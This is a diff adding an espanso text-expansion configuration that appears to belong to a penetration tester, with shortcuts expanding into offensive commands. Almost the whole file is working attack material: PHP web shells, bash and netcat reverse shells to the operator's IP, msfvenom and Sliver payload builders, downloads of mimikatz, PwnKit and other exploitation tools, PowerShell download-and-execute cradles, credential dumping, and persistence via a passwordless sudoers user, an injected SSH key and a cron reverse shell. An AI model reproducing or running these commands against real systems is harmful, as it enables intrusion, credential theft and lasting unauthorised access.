@@ -1,0 +1,231 @@
+# espanso match file
+
+global_vars:
+  - name: "IP"
+    type: "shell"
+    params:
+      cmd: ip -o -4 addr show tun0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' || ip -o -4 addr show eth0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}'
+
+  - name: "ssh_key"
+    type: "shell"
+    params:
+      cmd: "cat /home/kali/.ssh/id_rsa.pub"
+
+    # sudo apt install xclip -y
+  - name: "clipboard"
+    type: "shell"
+    params:
+      cmd: "xclip -o"
+
+
+matches:
+# QOL
+  - trigger: ":ip"
+    replace: "{{IP}}"
+
+  - trigger: ":clipboard"
+    replace: "{{clipboard}}"
+
+# SETUP              
+  - trigger: ":setup"                  
+    replace : |          
+      mkdir -p net && cd net         
+      echo "<?php echo shell_exec(\$_GET['cmd']); ?>" > shell.php
+      echo "<?php system(\"bash -c 'bash -i >& /dev/tcp/{{IP}}/443 0>&1'\"); ?>" > rev.php
+      echo "bash -c 'bash -i >& /dev/tcp/{{IP}}/443 0>&1'" > shell.sh
+      msfvenom -p linux/x86/shell_reverse_tcp LHOST={{IP}} LPORT=443 -f elf -o shell86.elf >/dev/null &
+      msfvenom -p linux/x64/shell_reverse_tcp LHOST={{IP}} LPORT=443 -f elf -o shell64.elf >/dev/null &
+      msfvenom -p windows/shell_reverse_tcp LHOST={{IP}} LPORT=443 -f exe -o shell86.exe >/dev/null &
+      msfvenom -p windows/x64/shell_reverse_tcp LHOST={{IP}} LPORT=443 -f exe -o shell64.exe >/dev/null &
+      msfvenom -p windows/powershell_reverse_tcp LHOST={{IP}} LPORT=443 -f psh -o rev.ps1 >/dev/null &
+      cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe . & 
+      wget -q https://github.com/carlospolop/PEASS-ng/releases/download/20230924-10138da9/linpeas.sh -O lp.sh &
+      wget -q https://github.com/peass-ng/PEASS-ng/releases/download/20240818-ea81ae32/winPEASany.exe -O winpeas.exe &
+      wget -q https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64 &
+      wget -q https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy32 &
+      wget -q https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 &
+      wget -q https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Powermad.ps1 &
+      wget -q https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-ReflectivePEInjection.ps1 &
+      wget -q https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe &
+      wget -q https://github.com/skahwah/SQLRecon/releases/download/v3.3/SQLRecon.exe &
+      wget -q https://github.com/jtmpu/PrecompiledBinaries/raw/master/SpoolSample.exe &
+      wget -q https://download.sysinternals.com/files/SysinternalsSuite.zip && unzip SysinternalsSuite.zip &
+      wget -q https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe &
+      wget -q https://github.com/ly4k/PwnKit/raw/main/PwnKit & 
+      wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.4/ligolo-ng_agent_0.4.4_linux_amd64.tar.gz && tar -xzf ligolo-ng_agent_0.4.4_linux_amd64.tar.gz & 
+      wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.4/ligolo-ng_proxy_0.4.4_linux_amd64.tar.gz && tar -xzf ligolo-ng_proxy_0.4.4_linux_amd64.tar.gz &                                                                 
+      wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.4/ligolo-ng_agent_0.4.4_windows_amd64.zip && unzip -o ligolo-ng_agent_0.4.4_windows_amd64.zip  &  
+      wget -q https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe &
+      git clone https://github.com/Flangvik/SharpCollection.git &
+      git clone https://github.com/gerbsec/RedTeam-TradeCraft.git &                                                                
+      python3 -m http.server 80
+
+  - trigger: ":msfwin"
+    replace: msfvenom -p windows/x64/shell_reverse_tcp LPORT=443 -f exe -o shell.exe  LHOST=
+
+  - trigger: ":msfmwin"
+    replace: msfvenom -p windows/x64/meterpreter_reverse_tcp LPORT=443 -f exe -o shell.exe  LHOST=
+
+  - trigger: ":msflin"
+    replace: msfvenom -p linux/x64/shell_reverse_tcp LPORT=443 -f elf -o shell.elf  LHOST=
+
+  - trigger: ":msfmlin"
+    replace: msfvenom -p linux/x64/meterpreter_reverse_tcp LPORT=443 -f elf -o shell.elf  LHOST=
+  
+  - trigger: ":msfsliver"
+    replace: msfvenom -a x64 -p windows/x64/custom/reverse_winhttp LHOST=tun0 LPORT=8443 LURI=/payload.woff -f exe -o sliverstage.exe EXITFUNC=thread
+
+  - trigger: ":msfxor"
+    replace: msfvenom -p windows/x64/custom/reverse_winhttp LHOST=tun0 LPORT=8443 EXITFUNC=thread LURI=/payload.woff -f csharp --encrypt xor --encrypt-key z -i 20 | tr -d '\n\r'
+    
+  - trigger: ":smb"
+    replace: impacket-smbserver -smb2support share .
+
+  - trigger: ":pyserver"
+    replace: "python3 -m http.server"
+
+  - trigger: ":phpserver"
+    replace: "php -S 0.0.0.0:"
+
+  - trigger: ":responder"
+    replace: "sudo responder -I tun0"
+
+  - trigger: ":nc"
+    replace: nc -nvlp 443
+    
+  - trigger: ":sliverprof"
+    replace: |
+      profiles new -e --mtls {{IP}}:443 --format shellcode -o windows shellcode-win
+      profiles new -e -a 386 --mtls {{IP}}:443 --format shellcode -o windows shellcode-winx86
+      profiles new -e --mtls {{IP}}:443 --format exe -o windows exe-win
+      profiles new -e --mtls {{IP}}:443 --format service -o windows service-win
+      profiles new -e --mtls {{IP}}:443 --format shared -o windows -R shared-win 
+      profiles new -e --mtls {{IP}}:443 --format exe -o linux  exe-lin
+      profiles new -e --mtls {{IP}}:443 --format shared -o linux -R shared-lin 
+
+  - trigger: ":sliverstage"
+    replace: stage-listener --url http://{{IP}}:8443 --prepend-size --profile shellcode-
+
+# ENUMERATION
+  - trigger: ":nmap"
+    replace: sudo nmap -sC -sV -v -p- -o nmap {{clipboard}} --min-rate 
+
+  - trigger: ":lping"
+    replace: for i in {1..254} ;do (ping -c 1 {{clipboard}}.$i | grep "bytes from" &) ;done
+
+  - trigger: ":wping"
+    replace: for /L %i in (1 1 254) do ping {{clipboard}}.%i -n 1 -w 100 | find "Reply"
+
+  - trigger: ":dirsearch"
+    replace: "dirsearch -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64 -e php,txt,html -f -u {{clipboard}}"
+    
+  - trigger: ":dirsearch2"
+    replace: "dirsearch -w /usr/share/wordlists/dirb/common.txt -t 64 -e php,txt,html -f -u {{clipboard}}"   
+
+  - trigger: ":dirsearch3"
+    replace: "dirsearch -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -t 64 -e php,txt,html -f -u {{clipboard}}"
+    
+  - trigger: ":findext"
+    replace: "ffuf -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://{{clipboard}}/blog/indexFUZZ"
+
+  - trigger: ":xfreerdp"
+    replace: "xfreerdp /dynamic-resolution /cert-ignore /compression /auto-reconnect /v:{{clipboard}} /u:user /p:pass "
+
+  - trigger: ":nuclei"
+    replace: "nuclei -c 50 -retries 3 -u {{clipboard}}"
+# REVERSE SHELLS                                                                
+  # LINUX                                                                       
+  - trigger: ":rcurl"                                                           
+    replace: curl http://{{IP}}/shell.sh | bash
+
+  - trigger: ":rwget"
+    replace: wget http://{{IP}}/shell.sh -O /tmp/shell.sh && bash /tmp/shell.sh
+    
+  - trigger: ":rbash"
+    replace: bash -c 'bash -i >& /dev/tcp/{{IP}}/443 0>&1'
+
+  - trigger: ":mkfifo"
+    replace: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {{IP}} 443 >/tmp/f
+    
+# POST
+  - trigger: ":pty"
+    replace: |
+      python3 -c 'import pty; pty.spawn("/bin/bash")' || python2 -c 'import pty; pty.spawn("/bin/bash")' || python -c 'import pty; pty.spawn("/bin/bash")' || python2.7 -c 'import pty; pty.spawn("/bin/bash")' || python3.6 -c 'import pty; pty.spawn("/bin/bash")' || python3.5 -c 'import pty; pty.spawn("/bin/bash")' || script -qc /bin/bash /dev/null 
+      export TERM=screen
+      stty rows 60
+      stty columns 150
+
+  - trigger: ":tty"
+    replace: |
+      reset
+      stty raw -echo; fg
+      stty rows 60 
+      stty columns 150
+      export TERM=screen
+      
+  - trigger: ":userpersist"
+    replace: |
+      "sudo useradd -m backup && echo "backup:password" | sudo chpasswd && echo 'backup ALL=(ALL) NOPASSWD: ALL' | sudo tee -a /etc/sudoers"   
+      
+  - trigger: ":sshpersist"
+    replace: |
+      mkdir -p ~/.ssh
+      echo "{{ssh_key}}" >> ~/.ssh/authorized_keys
+      
+  - trigger: ":cronpersist"
+    replace: (crontab -l 2>/dev/null; echo "* * * * * bash -c 'bash -i >& /dev/tcp/{{IP}}/443 0>&1'") | crontab -
+  
+  - trigger: ":wget"
+    replace: wget http://{{IP}}/
+  
+  - trigger: ":iwr"
+    replace: powershell.exe IEX(new-object net.webclient).downloadstring('http://{{IP}}/{{clipboard}}')
+
+  - trigger: ":certutil"
+    replace: certutil.exe -urlcache -split -f http://{{IP}}/
+  
+  - trigger: ":pligolo"
+    replace: sudo ip tuntap add user kali mode tun ligolo ; sudo ip link set ligolo up && sudo ./proxy -selfcert -laddr 0.0.0.0:443
+
+  - trigger: ":awinligolo"
+    replace: .\agent.exe -connect {{IP}}:443 -ignore-cert & 
+
+  - trigger: ":aligolo"
+    replace: ./agent -connect {{IP}}:443 -ignore-cert & 
+
+  - trigger: ":rligolo"
+    replace: sudo ip route add 192.168.110.0/24 dev ligolo
+
+  - trigger: ":mimikatz"
+    replace: .\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "exit"
+
+# EXPLOITS
+
+  - trigger: ":suid"
+    replace: find / -perm -u=s -type f 2>/dev/null
+
+  - trigger: ":root"
+    replace: |
+      wget http://{{IP}}/PwnKit && chmod +x PwnKit && ./PwnKit
+
+# DEFENSE
+  - trigger: ":kill"
+    replace: kill -9 
+
+  - trigger: ":pkill"
+    replace: pkill -9 -t pts/
+
+# WIFI
+
+  - trigger: ":airup"
+    replace: sudo airmon-ng start wlan0
+
+  - trigger: ":airodump"
+    replace: sudo airodump-ng wlan0mon -w ~/wifi/scan --manufacturer --wps --band abg
+
+  - trigger: ":hostname"
+    replace: hostnamectl set-hostname
+
+  - trigger: ":spoofmac"
+    replace: macchanger -A wlan0mon
+    
